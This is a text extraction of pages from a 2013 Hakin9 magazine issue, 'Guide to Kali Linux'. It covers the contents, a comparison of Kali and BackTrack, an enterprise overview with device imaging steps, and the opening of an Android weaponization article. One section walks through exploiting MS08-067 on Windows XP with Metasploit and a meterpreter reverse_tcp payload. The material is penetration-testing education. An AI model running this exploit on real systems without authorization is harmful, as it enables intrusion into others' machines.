              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 3}, page_content='Extra 03/2013 4\\nPRACTICAL PROTECTION  IT SECURITY MAGAZINE\\n team\\nEditor in Chief: \\nJulia Adamczewska \\njulia.adamczewska@hakin9.org\\nEditorial Advisory Board: \\nHans van Beek, Peter Harmsen, Casey Parman\\nProofreaders: Julia Adamczewska, Krzysztof \\nSamborski\\nSpecial thanks to our Beta testers and Proofreaders \\nwho helped us with this issue. Our magazine would \\nnot exist without your assistance and expertise.\\nPublisher: \\nPaweł Marciniak\\nCEO: \\nEwa Dudzic\\newa.dudzic@hakin9.org\\nProduct Manager: \\nKrzysztof Samborski\\nkrzysztof.samborski@hakin9.org\\nProduction Director: \\nAndrzej Kuca\\nandrzej.kuca@hakin9.org\\nMarketing Director: \\nJulia Adamczewska \\njulia.adamczewska@hakin9.org\\nArt. Director: \\nIreneusz Pogroszewski\\nireneusz.pogroszewski@software.com.pl\\nDTP: \\nIreneusz Pogroszewski\\nPublisher: \\nHakin9 Media Sp. Z o.o. SK\\n02-676  Warszawa, ul. Postępu 17D\\nNIP 95123253396\\nPhone: 504927626\\nwww.hakin9.org/en\\nWhilst every effort has been made to ensure the \\nhighest quality of the magazine, the editors make no \\nwarranty, expressed or implied, concerning the results \\nof the content’s usage. All trademarks presented in the \\nmagazine were used for informative purposes only. \\nDISCLAIMER!\\nThe techniques described in our magazine \\nmay be used in private, local networks only. \\nThe editors hold no responsibility for the \\nmisuse of the techniques presented or any \\ndata loss.\\nDear Readers,\\nAlong with the Autumn here it comes the comprehen -\\nsive ‘Guide to Kali Linux’. In the following issue we will \\nfocus on this popular, yet still-much-to-discover pentest -\\ning tool.\\nSo we will start with the Basics and see what’s new \\nin Kali Linux comparing to BackTrack and also we will \\nbrowse the set of new and updated tools in the article ‘Kali \\nLinux for Enterprises’. \\nThe Attack section is full of great tips for pentesters \\n(and not only), so they can see how to weaponize the an -\\ndroid platform and also perform the attack on servers. \\nThe Defense section contains a great paper on deploy -\\ning network vulnerability scanners for medical clients and \\npresents an interesting view on Kali scanning. There is \\nalso a fine overview on Kali as a tool for both good and \\nbad purposes. \\nWe are sure you will find a lot of helpful information in \\nthe whole issue. \\nHakin9’s Editorial Team would like to give special \\nthanks to the authors, betatesters and proofreaders.\\nWe hope our effort was worthwhile and you will find the \\nHakin9 Guide to Kali Linux issue appealing to you. We \\nwish you a nice read!\\nJulia Adamczewska \\nand the Hakin9 team\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 4}, page_content='www.hakin9.org/en\\nCONTENTS\\nBASICS\\nKali Linux – What’s new? 06\\nBy Steven McLaughlin, Security Researcher \\nKali Linux released earlier in the year is dubbed the \\nmost advanced penetration testing distribution, ever. \\nHow does it compare to BackTrack?, and: What’s the \\ndifference?\\nKali Linux for Enterprises 10\\nBy Navneet Sharma, Information Security Analyst \\nWhenever we think of Penetration Testing (PT) the first \\nname that comes to our mind is “Backtrack (BT)”, which \\nwe have been using for the last few years. Backtrack, \\nfunded by offensive Security (www.offensive –Security.\\ncom), is also one of the most popular UBUNTU Linux \\nbased platform, with collection of organized security \\ntesting tools such as Open-VAS, maltigo, Metasploit \\nFramework (MSF), etc. Last release to Backtrack series \\nwas Backtrack 5 R2 with codename Revolution.\\nKali Linux is the latest linux distribution made for pen -\\netration testing by and used by security assessors and \\nhackers. Kali Linux is also considered as a successor \\nto Backtrack.\\nATTACK\\nWeaponization of Android Platform  \\nusing Kali Linux 16\\nBy Daniel Singh, Independent Consultant in network \\nand systems security\\nKali Linux has become the most popular tool for pro -\\nfessional penetration testing and security auditing. In \\nthis article, we will review how to couple the functional -\\nity of Kali Linux with Android platform over HTC One X \\nsmartphone to create an invincible penetration-testing \\nweapon.\\nKali Linux, Attacking Servers 24\\nBy Ismael Gonzalez D., Security Researcher, CEH, \\nMCP, MCDTS, MCSA, LPIC-1\\nThis article will show you how to perform attacks on web \\nservers, getting full access to the system and database. \\nJust by using some of the ‘Top Ten’ tools of Kali Linux.\\nHands On: How to Create “Backdoor”  \\nto Remote Access with Kali Linux,  \\nDNS Spoofing Attack with Ettercap  \\nand Cloning Sites with Kali Linux 28\\nBy Rafael Fontes Souza, Co-Founder at Grey Hats, \\nmember of the “French Backtrack Team”\\nThe three articles describe very useful tools in Kali and \\ncover the ideas of creating backdoor, how to perform \\nthe spoof attack and how to clone websites with SET \\nAttack Method. DEFENSE\\nKali Scanning for HIPAA – A Proof of  \\nConcept: using Kali Linux to deploy  \\ndistributed network vulnerability  \\nscanners for medical clients 34\\nBy Charlie Waters, Security Officer and Senior \\nConsultant for Infinity Network Solutions\\nThe Health Insurance Portability and Accountability \\nAct of 1996 (HIPAA) requires organizations who han -\\ndle electronic Protected Health Information (e-PHI) to \\ntake action and reduce risk relative to potential security \\nbreaches of digital communication and storage of pa -\\ntient information. Open Source solutions can be lever -\\naged as a low-cost and effective strategy to minimize \\nrisk when used as component of a larger information \\nsecurity program. With a long “track” record of commu -\\nnity support, Kali is an open source Linux distribution \\ncontaining many security tools to meet the needs of \\nHIPAA network vulnerability scans. \\nKALI LINUX  \\n– A Solution to HACKING/SECURITY 40\\nBy Deepanshu Khanna, Linux Security Researcher\\nToday is the world of technology and everyone some -\\nhow is attached to it. Some are using the technology for \\nthe good purpose and some are using it for bad purpos -\\nes and Internet is one of those technologies which de -\\nfine both my statements. Internet is being used both by \\nthe good (the White Hats) and the bad (the Black Hats). \\nSo, my paper is totally based on the above line that the \\nOS (Operating System) KALI LINUX (which is an exten -\\nsion to Backtrack) can be used in both the ways either \\nfor good or bad. \\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 5}, page_content='Extra 03/2013 6BASICS\\nFor some years BackTrack linux has been \\nthe premier pen-test distribution. The new -\\nest pen-test distribution released by Of -\\nfensive Security which supersedes BackTrack \\ncomes with some massive and welcome im -\\nprovements. The biggest change from BackTrack \\nis the move from Ubuntu linux to Debian Wheezy \\nlinux. The first thing I notice is that the installa -\\ntion is no longer launched by executing a script \\non the Desktop as it was with BackTrack, but is \\ninitiated but booting into a proper Debian instal -\\nlation system. The process generally feels a lot \\nsmoother from the start. I have also noticed that \\nin general Kali doesn’t break as easily as Back -\\ntrack and it generally has a much more stable \\nfeel to it. So what’s the difference between Back -\\nTrack and Kali?\\nBackTrack 5 v Kali\\nUbuntu, which BackTrack is based on, has a gen -\\neral feel to it that it is trying to babysit you as the \\nuser, which can be annoying to an experienced \\nlinux user. Ubuntu likes to make everything user \\nfriendly and tries to cut out any complex configu -\\nrations. Debian, which Kali is based on, may not \\ncome across to be so ‘user friendly’ to someone \\nwho is not that experienced with linux, and re -\\nquires more hands on experience with linux, but \\nis generally more configurable and stable. Person -ally, I definitely prefer the Debian base for Kali as I \\nlike to tweak. This distribution is not for linux begin -\\nners in any case. \\nWhat Happened to Firefox? \\nOne of the first things I notice is that Firefox has \\nbeen replaced by Iceweasel. On first instance \\nthis might leave you wondering what Iceweasel is \\nand why it has replaced Firefox. The truth is that \\nIceweasel IS Firefox. The Debian project patch -\\nes Iceweasel by backporting security fixes, thus \\nmaking it secure enough to be declared in debi -\\nan stable version. Because this is the case they \\nhad to re-brand it Iceweasel as the modifications \\nmade by Debian project were not approved by the \\nMozilla foundation in order to use the Thunder -\\nburd logo. Other than backported security patch -\\nes and the logo, both Firefox and Iceweasel are \\nidentical. I would recommend staying with Ice -\\nweasel on Debian, but if you really want to use \\nFirefox you can install it in the following manner \\nby first uninstalling Iceweasel (Listing 1).\\nFHS-compliance and /pentest\\nAnother massive step in the right direction is FHS-\\ncompliance. File Hierarchy Standard (FHS) compli -\\nance specifies guiding principles for each part of the \\nfile system, and means that the directory structure \\nand file system is standardised such that software Kali Linux  \\n– What’s new?\\nKali Linux released earlier in the year is dubbed the most \\nadvanced penetration testing distribution, ever. How does it \\ncompare to BackTrack?, and: What’s the difference?\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 6}, page_content='www.hakin9.org/en 7Kali Linux – What’s new?\\nand users can easily find the location of installed \\nfiles such as binaries and libraries. This will also \\nlead to a more stable system in general.\\nIn BackTrack, every pen-test tool which you \\nwanted to use you either had to express the full \\npathname to the tool e.g. /pentest/passwords/\\nrainbowcrack/rcrack  or change to the directory in \\norder to use it. Kali no longer uses the  /pentest  di-\\nrectory tree, and all command line pen-test tools \\nseem to be located in /usr/bin . Pen-test tools are now in PATH and can now be fired up from any -\\nwhere in the system. I certainly don’t miss the /\\npentest  directory. This certainly makes life a whole \\nlot easier.\\nNo Nessus\\nNessus does not come installed with Kali and is \\nnot available in the Kali repositories. One reason \\nfor this could be that Kali linux is based on Debi -\\nan Wheezy (Debian 7), however if you check the \\navailable downloads from the tenable website, \\nthey have only released a version of Nessus for \\nversion 6 of Debian. Another reason for this may \\nbe because Nessus is more of an audit and com -\\npliance benchmarking tool than a pen-test tool, \\nand perhaps it was thought too bloated to include. \\nNessus is certainly something I see more of in -\\nstalled on dedicated servers these days. Howev -\\ner if you want to install it, the Debian 6 version of \\nNessus which can be downloaded from the ten -\\nable website will still work. The only other pos -\\nsible reason for not including Nessus is that Nes -\\nsus is forbidden in the Penetration Testing with \\nBackTrack(PWB) Course (which will probably \\nadvertisement\\nListing 1.  How to install Firefox\\necho “deb http ://downloads .sourceforge .net/\\nproject/ubuntuzilla /mozilla/apt all main” \\n>> /etc/apt/sources.list\\napt-get remove iceweasel\\napt-key adv –recv -keys –keyserver \\nkeyserver .ubuntu.com C1289A29\\napt-get update\\napt-get install irefox -mozilla-build\\napt-get install thunderbird -mozilla-\\nbuild\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 7}, page_content='Extra 03/2013 8BASICS\\nget a new name now because of Kali). Offensive \\nSecurity encourages all of its PWB students to \\nuse more specialised and targeted tools to per -\\nform enumeration and discovery. Further, differ -\\nent tools quite often output different results, so it’s \\nbest to use more highly targeted tools in a pen-\\ntest to get specific results rather than the results \\nof a generalised scan or vulnerability assessment \\ntool such as Nessus.\\nOther Notable Changes\\nKali uses Leafpad instead of gedit which is a much \\nlighter weight text editor than gedit. It is also no -\\nticeably faster. But if you want to use gedit it is \\nstill available in the Kali respository with a simple \\napt-get install gedit.  Gedit may appear bloated to \\nsome unless you are interested in syntax highlight -\\ning. Personally I like syntax highlighting, but have \\na habit of writing all my code in vim from the ter -\\nminal window which has this functionality anyway \\n– each to their own I guess. Here’s a list of some \\nother welcome changes:\\n•  The PDF viewer which was used in BackTrack \\nhas now been replaced with Document Viewer \\nwhich is great since I found the PDF viewer a \\nbit lakey.\\n•  You can now easily create your own custom \\nISO of Kali by using Debian live-build scripts.\\n•  Kali comes with VLC player pre-installed which \\nwas not included in BackTrack.\\n•  I’ve also noticed that the ISO image for Kali is \\nalmost 1GB smaller than the BackTrack 5 R3 \\nISO.\\nUpgrading to Future versions of Kali\\nIf you had BackTrack 4 installed and wanted to up -\\ngrade to BackTrack 5, the only way you could have \\nachieved this was to do an entire reinstall. This \\nwould be time consuming, and mean you would \\nhave to re-configure everything back to the way \\nyou wanted it, and customise all your tools again. \\nWith Kali however, an upgrade to future major re -\\nleases can be done by simply issuing the following \\ncommands: Listing 2.\\nThe Kali repository gets its security packages \\nfrom the Debian repository, and all of its tools are \\nnow packaged up to be Debian compliant. \\nListing 2.  Upgrading Kali to the next major distribution\\nroot@kali :~# apt-get update\\nroot@kali :~# apt-get dist-upgradeSummary\\nIn summary, Kali linux feels a lot smoother to \\nwork with than BackTrack, whilst most of the \\ntools remain fairly similar or unchanged; the \\nmain overhaul to be commended on is the over -\\nall improvement in the quality of the distribution \\nfrom the move to Debian. It now feels like a com -\\nplete distribution with far less flakiness and a lot \\nmore stability. For a duck dive into the pen-test \\ntools which ship with Kali, I would recommend \\ndoing Offensive Security’s Penetration Testing \\nwith BackTrack(PWB) course which will familiar -\\nise you with all the tools necessary to conducting \\na complete penetration test with reporting. The \\nmain advantage you will notice is that the tools \\nare now all in path with Kali. The only advice I \\nhave in pursuing this course is to get permission \\nfrom your other half, as it will take a good couple \\nof months out of your life, but is extremely fun, ad -\\ndictive, and rewarding with all the breakthroughs \\nyou will have. Well done to the Offensive Security \\nTeam for creating such an improved distribution, \\nand good luck with your Kali experience.\\nSTeveN MCLAUgHLIN  \\nSteven McLaughlin is an experienced in -\\nformation and network security profes -\\nsional. With both a technical and consult -\\ning background, he has been heavily in -\\nvolved in working with global companies \\ndeveloping solutions and delivering large \\nscale projects. He also works in highly spe -\\ncialized teams in order to develop new ideas and patents and \\nbring new products to market.\\nOn the Web\\n•  http://www.pathname.com/fhs/  – Information on \\nFile Hierarchy Standard\\n•  http://www.ofensive-security.com/information-securi -\\nty-training/penetration-testing-with-backtrack/  – Pen -\\netration Testing with Backtrack Course\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 8}, page_content=''),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 9}, page_content='Extra 03/2013 10BASICS\\nKali Linux is the latest linux distribution made \\nfor penetration testing by and used by secu -\\nrity assessors and hackers. Kali Linux is al-\\nso considered as a successor to Backtrack. Back -\\ntrack was based on Ubuntu Distribution ( www.\\nubuntu.com ) whereas Kali Linux complies with \\ndebian development standards ( www.debian.org ).\\nBuilding Kali Linux was something like Re-In -\\nventing the wheel again. Kali Linux was built from \\nscratch, to support under the Debian platform and \\nalso to make it compatible with new or existing se -curity tools. Kali Linux is designed to support both \\n32-bit and 64-bit platform and ARM Architecture. \\nevolution of Kali Linux\\nWhen Backtrack was initially developed by Offen -\\nsive-Security, with consideration in mind to con -\\nduct network based Vulnerability Assessment and \\nPenetration testing. They started releasing BT ver -\\nsions with their name, as depicted on (Figure1). \\nWhen BT 3 was released, it was released with \\ncodename “Whydah” and added functionality and \\ntools to conduct wireless testing. BT 4 released \\nwith Codename “ Pwnsauce ” and “ Nemisis ”, with \\nadded functionality of web application testing and \\nwith more advanced and improved GUI based in -\\nterface. And with continuation to BT 5 R2 with se -\\ncurity tools update like BeeF(Browser Explotation \\nFrwamework), bluelog, dnschef, dpscan, etc.\\nKali Linux is considered an enterprise ready solu -\\ntion, because it considered enterprise users when \\nit was designed. Kali runs on a Debian platform, \\nwhich supports many software repositories to keep \\nupdating OS with latest releases and patch. This \\ncapability reduces updating problem, which users \\nwere facing on BT environment.\\nAlso Offensive security team up with Rapid 7 \\n(Makers of Metasploit Framework), to provide offi -\\ncial support to Kali Linux. So MSF ( most important ar -\\nsenal of BT ) was rebuildt to support Debian platform.KALI Linux  \\nFor enterprises\\nWhenever we think of Penetration Testing (PT) the first \\nname that comes to our mind is “Backtrack (BT)” , which we \\nhave been using for the last few years. Backtrack, funded \\nby offensive Security (www.offensive –Security.com), is also \\none of the most popular UBUNTU Linux based platform, \\nwith collection of organized security testing tools such \\nas Open-VAS, maltigo, Metasploit Framework (MSF), etc. \\nLast release to Backtrack series was Backtrack 5 R2 with \\ncodename Revolution.\\nFigure 1. Evolution of Kali Linux\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 10}, page_content='www.hakin9.org/en 11KALI Linux (For enterprises)\\nDevelopment Architecture\\nKali Linux supports various Reduced Instruction \\nset Computing  (RISC) based development archi -\\ntecture. Kali ARM can be made for:\\n•  EikaMX\\n•  Beaglebone Black\\n•  CuBOX\\n•  Galaxy Note 10.1\\n•  Samsung Chromebook\\n•  MK/SS808\\n•  ODROID U2\\n•  Raspberry Pi\\n•  ARM Chroot\\nLet’s discuss here few of them, how these ARM’s \\ncan be used for Kali Linux.\\neikaMX\\nEfika is a line of power efficient ARM architecture and \\nPower architecture. EfiKa MX Open Client is a net -\\nwork computer based around the EFIKA MX micro-\\nmother board. EfikaMX has following specifications:\\n•  Freescale i.MX515 (ARM Cortex-A8 800MHz)\\n•  3D Graphics Processing Unit\\n•  512 MB RAM\\n•  8GB USB\\n•  2x USB 2.0 ports\\n•  Audio jacks for headset\\n•  Built in Speaker\\n•  Bluetooth (Broadom 2043) \\nSteps to build image by EikaMX\\n•  Step 1: Get 8GB micro SD Card, class 10 high -\\nly recommended\\n•  Step 2: Download Kali image\\n•  Step 3: use dd utility to image this ile to SD card \\nroot@kali:~ dd if =kali-1.0.1-eimx.img of=/dev/sdb \\nbs=512k\\nBeaglebone Black\\nBeaglebone boards are tiny computers with all ca -\\npability of today’s desktop machine without bulk \\nnoise, expense or noise.\\nSteps to build image using Beaglebone:\\n•  Step 1: Get 8GB micro SD Card, class 10 high -\\nly recommended\\n•  Step 2: Download Kali Linux Beaglebone\\n•  Step 3: use dd utility to image this ile to SD card\\nroot@kali:~ dd if =kali-bbb.img of=/dev/sdb bs=512kSamsumg galaxy Note 10.1\\nOf course the popular one and most people have \\nit. Also attract pentesters to build image for this. \\nKali also listed down its procedure to make image \\nfor Galaxy note 10.1. Galaxy note 10.1 has follow -\\ning specification:\\n•  1.4 GHz Quacore processor\\n•  2 GB RAM\\nSteps to build image for Samsung Note (Steps as \\nper Kali Linux.org website)\\n•  Step 1: Get 8GB micro SD Card\\n•  Step 2: Root the Samsung Galaxy Note 10.1\\n•  Step 3: Download Kali Linux for Samsung gal -\\naxy Note 10.1\\n•  Step 4: Rename the image to linux.img\\n•  Step 5: Download Recover.img ile from down -\\nload section of Kali Linux.orf and copy it on \\nyour Note 10.1 sdcard\\n•  Step 6: use dd utility to image this ile to SD card\\nroot@kali:~ dd if =/dev/block/mmcblk0p6 \\nof=recovery.img_orig\\n•  Step 7: Reboot Galaxy  note 10.1 to recovery \\nmode , press Power Off  and Volume UP  button. \\nOnce you see the text for “Samsung Galaxy \\nNote 10.1”, release the power button but keep \\npressing the Volume UP button.  This should \\nboot into Kali and auto Login into Gnome. Root \\nPassword is “Changeme”\\n•  Step 8: Open Keyboad: Applications -> Univer -\\nsal Access -> Florence Virtual Keyboard\\nNote: development architecture referenced from \\nhttp://docs.kali.org/category/armel-armhf .\\nDirectory Structure\\nAs Kali is successor to Backtrack, so most of its fea -\\ntures are inherited from backtrack. Like Backtrack,  \\nFigure 2.  Directory Structure\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 11}, page_content='Extra 03/2013 12BASICS\\nKali tools are also divided into 12 categories (Fig -\\nure 2):\\n•  Information Gathering\\n•  Vulnerability Analysis\\n•  Web Applications\\n•  Password Attacks\\n•  Wireless Attacks\\n•  Stress Testing\\n•  Exploitation Tools\\n•  Snifing/Snooping \\n•  Maintaining Access•  Reverse Engineering\\n•  Forensics\\n•  Reporting Tools\\nRemembering Backtrack 5, penetration direc -\\ntories are organized in under /pentest  directory. \\nBut in Kali Linux doesn’t store security tools un -\\nder pentest directory, commands are generally ex -\\necuted from /usr/sbin (Figure 3).\\nAnother important category of tools added in Kali \\nLinux are “TOP 10 Security Tools” which are fre -\\nquently used by pentesters, as presented Figure 4. \\nOffensive security has also put lots of effort to \\nmake Kali enterprise ready solution by adding \\nmore tools in Kali. Researchers most of the time \\nused backtrack for “MSF” and to do other stuff, \\nthey depend on other penetration testing distro’s \\nor they make their OWN ISO or install on their own \\noperating system. (Figure 4) shows the compari -\\nson between Backtrack and Kali (Figure 5).\\nFigure 4.  Kali Linux “Top 10 Security Tools”\\nFigure 3.  Kali Vs. Backtrack: Change in Directory Structure\\nFigure 5.  Tool Comparison between Kali and Backtrack\\nFigure 6.  Opening metaspoloit with msfconsole command\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 12}, page_content='www.hakin9.org/en 13KALI Linux (For enterprises)\\nLet’s do some Practical things with Kali\\nAs we know the famous vulnerability in Windows-\\nXP “MS08-067: Vulnerability in Server Service \\ncould allow Remote-Code execution” \\nSome Brief about the vulnerability\\nRemote code execution vulnerability exists in the Serv -\\ner service on Windows systems. The vulnerability is due to the service not properly handling specially crafted \\nRPC requests. An attacker who successfully exploited \\nthis vulnerability could take complete control of an af -\\nfected system .\\nReference to the vulnerability\\nhttp://technet.microsoft.com/en-us/security/bulle -\\ntin/ms08-067 .\\nSystem exploited successfully\\nWindows XP Service PACK-2.\\nSteps followed to exploit the vulnerability (Figures \\n6-9). Steps explained in a nutshell.\\nStep 1: Open MSF Console\\nmsfconsole\\nFigure 7. Searching exploits for netapi\\nFigure 8.  Setting up exploit, adding required variables, and exploiting the target\\nFigure 9.  Verifying exploited system\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 13}, page_content='Extra 03/2013 14BASICS\\nStep 2: Search for exploit “netapi”, \\nuse command “search netapi”\\nStep 3: Configure the exploit for execution to \\ntarget\\nUse following commands to exploit target\\n•  Use exploit/windows/smb/ms08_067_netapi\\n•  Set payload windows/meterpreter/reverse_tcp\\n•  Set lhost <your machine IP>\\n•  Set rhost <Remote IP>\\n•  exploit\\nStep 4: exploit run Successfully, Run vNC\\nKali Linux installation and Software \\nrepositories\\nInstallation\\n•  Download VMPlayer or VMware workstation \\nfrom Vmware website as per yours operating \\nsystem\\n•  Install on the VMPlayer or VMWare on your \\nplatform\\n•  Create Virtual machine (With min 20 GB Hard \\ndisk Space, 1GB RAM, Two Network Adapter, \\nrest all by default)\\n•  Mount KALI ISO ile on the VMWARE setting\\n•  Switch on the Virtual machine and boot it from \\n“CD-ROM” by pressing “ESC”\\n•  Once GRUB Appear, and then click on the in -\\nstall (or it can be used as a LIVE CD)\\n•  Follow the instruction as written on screen \\n(Similar to backtrack installation)\\n•  Finish the installation\\nUpdate Kali\\n•  Open leafpad•  Open ile from /etc/apt/sources.list  (Some \\nsources path already present there, but more \\ncan be added from Google)\\n•  apt-get update\\n•  apt-get upgrade\\n•  apt-get dist-upgrade\\nSummary\\nKali Linux a Debian based platform for advanced \\npenetration testing. Kali approach is good try for \\nstepping ahead into next generation of penetration \\ntesting. Researchers and developers of offensive \\nsecurity have put their best effort to make Kali plat -\\nform enterprise ready. As Debian being the older \\nplatform for Linux, it also has a large user base \\ncompared to UBUNTU. Debian based Operating \\nsystem has also good market capture so move -\\nment from Ubuntu to Debian platform will definitely \\ngive power to end users. \\nAt last KALI is enterprise focused, developed \\nkeeping in mind enterprise needs, so there is much \\nmore to evolve in near future. So good luck to Of -\\nfensive Security team!\\nKeep Learning and Be Secure!\\nNAvNeeT SHARMA\\nNavneet Sharma is a Solution Architect \\nwith Tata consultancy services, working in \\ndomain of information security and net -\\nwork security. He holds a degree of Bache -\\nlor of Technology in Information Technol -\\nogy and has worked in diverse range of in -\\ndustry verticals over the last 7 years of his \\ncareer. Some key assignment that he has been involved in in -\\nclude network security design and consulting, security audit -\\ning (Application/Network), Vulnerability Assessment and Pen -\\netration Testing.\\nReferences\\n•  http://en.wikipedia.org/wiki/BackTrack  – for Backtrack in a NutShell\\n•  http://www.ofensive-security.com/tag/kali-linux/  – for all post on Kali Linux about installation and managing\\n•  http://www.kali.org/  – for introduction to Kali\\n•  http://docs.kali.org/category/armel-armhf  – for Kali Linux ARM Architecture also for creating ARM image s on Eika -\\nMX, Beaglebone etc.\\n•  http://www.backtrack-linux.org/backtrack/backtrack-5-r2-r eleased/  – For Oicial introductory release of Backtrack 5\\n•  http://www.h-online.com/open/news/item/Kali-Linux-arrives -as-enterprise-ready-version-of-BackTrack-1822241.html  \\n– For Story behind building Kali Linux for enterprises\\n•  http://www.ofensive-security.com/kali-distribution/kali-l inux-on-galaxy-note/  – For deeper look of Kali Linux instal -\\nlation on Galaxy Note\\n•  https://wiki.debian.org/EikaMX#What_is_EikaMX.3F  – For Introduction of EFIKAMX chipset\\n•  http://www.infosecisland.com/blogview/22236-Backtrack-5-r3 -List-of-Some-of-the-New-Tools-and-Programs.html  – \\nFor introduction to new tools added to BackTrack\\n•  http://www.beagleboard.org  – Introduction to BeagleBone Chipset and it’s working\\n•  http://www.backtrack-linux.org/  – All about BackTrack and it’s feature.\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 14}, page_content='A BZ Media Event  \\nBig Data TechCon™is a trademark of BZ Media LLC.“Big Data TechCon is loaded with great networking \\nopportunities and has a good mix of classes with te chnical\\ndepth, as well as overviews. It’s a good, technical ly-focused\\nconference for developers.”\\n—Kim Palko, Principal Product Manager, Red Hat\\n“Big Data TechCon is great for beginners as well as \\nadvanced Big Data practitioners. It’s a great conference!”\\n—Ryan Wood, Software Systems Analyst, Government of Canada\\n“If you’re in or about to get into Big Data, this is the \\nconference to go to.”\\n—Jimmy Chung, Manager, Reports Development, AvectraDiscover how to master Big Data from real-world practitioners – instructors \\nwho work in the trenches and can teach you from real-world experience!Big Data gets real \\natBig Data TechCon!\\nSan Francisco\\nOctober 15- 17, 2013\\nwww.BigDataTechCon.com• Collect, sort and store massive quantities\\nof structured and unstructured data\\n• Process real-time data pouring into\\nyour organization\\n• Master Big Data tools and technologies\\nlike Hadoop, Map/Reduce, NoSQL \\ndatabases, and more• Learn HOW TO integrate data-collection \\ntechnologies with analysis and \\nbusiness-analysis tools to produce \\nthe kind of workable information\\nand reports your  organization needs\\n• Understand HOW TO leverage Big Data \\nto help your organization todayOver 60how-to \\npractical classes\\nand tutorials \\nto choose\\nfrom!\\nThe HOW-TO conference for Big Data and IT professionalsCome to Big Data TechCon to learn the best ways to:'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 15}, page_content='Extra 03/2013 16AT TACK\\nThe global market is flooded, ruled by android-\\nbased mobile devices and smartphones. \\nMobile phones are becoming smaller and \\nhave greater processing power. These devic -\\nes with mobile internet and wireless connectivity \\nhave revolutionised businesses and work method -\\nologies. Tasks like connectivity, sharing, process \\nautomation and extensive computing over smart -\\nphones have become the norm. The android oper -\\nating system has made smartphones and mobile \\ndevices, a very powerful tool in the hands of secu -\\nrity professionals and even deadlier in the hands \\nof black hats.\\nAndroid is a very popular operating system for \\nmobile devices such as smartphones and tablets. \\nInitially developed by Android Inc. and then bought \\nby Google in 2005. Android is an Open Handset \\nAlliance product and released under the Apache \\nlicense. The power of Android platform lies in the \\nthousands of apps running on it, backed by a strong \\nand active open source developer community. Used \\nby 70% of the mobile developer community, thus making it the most widely used platform. It is con -\\nsidered a highly customisable and scalable mobile-\\nbased distribution, making it widely accepted foun -\\ndation base for community-driven mobile projects. \\nAndroid Architecture Overview \\nAndroid devices, built on Linux kernel version 2.6 \\nand the first commercially distribution made avail -\\nable on HTC Dream handset in 2008. Since then \\nnumerous updates have incrementally improved \\nthe operating system base and added new and \\nimproved functionality. The latest official release \\nis Jelly Bean 4.3 with a slogan „An even sweet -\\ner Jelly Bean”. Android’s user interface uses touch \\ninputs to correspond to real world actions. These \\nresponses are immediate, with vibrations and hap -\\ntic feedback capabilities. The Android framework is \\nvery extensive as it has a layered approach. It has \\nfive layers, the kernel and low-level tools, the na -\\ntive libraries, the android runtime with Dalvik virtual \\nmachine, the framework layer is on top of this and \\nfinally the applications run above everything. Weaponization of \\nAndroid Platform using \\nKali Linux\\nKali Linux has become the most popular tool for \\nprofessional penetration testing and security auditing. \\nIn this article, we will review how to couple the \\nfunctionality of Kali Linux with Android platform \\nover HTC One X smartphone to create an invincible \\npenetration-testing weapon.\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 16}, page_content='www.hakin9.org/en 17Weaponization of Android Platform  using Kali Linux \\nThe Linux kernel is written in C/C++ and the \\nframework is written in java and runs on Dalvik vir -\\ntual machine. The present kernel is 3.0.x and has \\nadded support for Bluetooth and Wi-Fi encryption. \\nAndroid is built to run on devices with little main \\nmemory and low powered CPU’s. Majority of the \\nmodules are made to consume low power. The ac -\\ntual android runtime consists of Dalvik virtual ma -\\nchine and java libraries. All applications in android \\ndevices run in their own sandboxed Dalvik virtu -\\nal machines. Each applications runs with its own \\nunique user id and in its own process. Android has \\nvery efficient memory and power management. \\nAndroid has support for various APIs, has media \\nframework, integrated internet browser support, \\nhighly optimised graphics, camera, GPS, compass, \\nand accelerometer sensors. The applications can \\nbe easily created using SDKs and are available \\nusing the various apps markets. The biggest ap -\\nps market is Google Play where one can find vari -\\nous apps in categories and using searches. Apart \\nfrom the default Google Play, there are many oth -\\ner app stores to download and install apps. Table \\n01 provides a list of widely used open markets, but \\nmake sure not to trust anyone blindly in the present \\nscenarios of malicious apps and malware threats. \\nAlways disable USB debugging and uncheck the \\n“Unknown sources” option under Settings >> Ap -plications menu to keep your android device safe \\nfrom such tampering (Figure and Table 1).\\nTable 1. List of available Android App Stores\\nSl # Apps Market Url\\n01 Google Play https://play.google.com/store?hl=en\\n02 Amazon store http://www.amazon.com/mobile-\\napps/b?node=2350149011\\n03 GetJar http://www.getjar.mobi/\\n04 Slide ME http://slideme.org/\\n05 F-Droid https://f-droid.org/\\n06 Appoke http://beta.appoke.com/\\n07 Appia http://appia.com/\\n08 App Brain http://www.appbrain.com/\\n09 Android Pit http://www.androidpit.com/\\n10 Handango http://www.handango.com/Home.\\njsp?siteId=2218\\n11 Handster http://www.handster.com/\\n12 Mobango http://in.mobango.com/\\n13 Opera Store http://apps.opera.com/en_in/\\n14 Soc.io http://soc.io/\\n15 Insyde Market 